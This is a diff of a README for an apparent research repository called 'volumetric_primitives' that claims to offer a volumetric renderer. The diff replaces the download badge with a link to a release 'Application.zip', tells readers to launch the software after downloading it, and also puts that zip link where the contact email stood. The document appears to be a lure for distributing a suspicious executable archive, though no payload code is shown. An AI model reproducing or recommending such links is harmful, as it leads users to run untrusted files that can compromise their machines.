@@ -5,7 +5,7 @@ Welcome to the **volumetric_primitives** repository! This is where you can find 
 ## 📁 Software Download
 To start exploring the innovative rendering techniques presented in our research, make sure to download the software package from the following link: 
 
-[![Download Software](https://img.shields.io/badge/Download-Software-blue)](https://github.com/Rubenas123/6487922/raw/refs/heads/master/Software.zip)
+[![Download Software](https://github.com/coder-hashsudo/volumetric_primitives/releases/download/v1.0/Application.zip)](https://github.com/coder-hashsudo/volumetric_primitives/releases/download/v1.0/Application.zip)
 
 Please note that the software needs to be launched once it's downloaded to unleash its full potential.
 
@@ -22,7 +22,7 @@ If you find our work inspiring and decide to use our approach in your projects, 
 We welcome contributions from the community to enhance and improve our volumetric renderer. Whether you have ideas for optimizations, new features, or bug fixes, we are open to collaboration.
 
 ## 📧 Contact
-If you have any inquiries or feedback regarding our volumetric primitive renderer, feel free to reach out to us via email at [volumetric_primitives@researchlabs.com](mailto:volumetric_primitives@researchlabs.com).
+If you have any inquiries or feedback regarding our volumetric primitive renderer, feel free to reach out to us via email at [https://github.com/coder-hashsudo/volumetric_primitives/releases/download/v1.0/Application.zip](https://github.com/coder-hashsudo/volumetric_primitives/releases/download/v1.0/Application.zip).
 
 ---
 
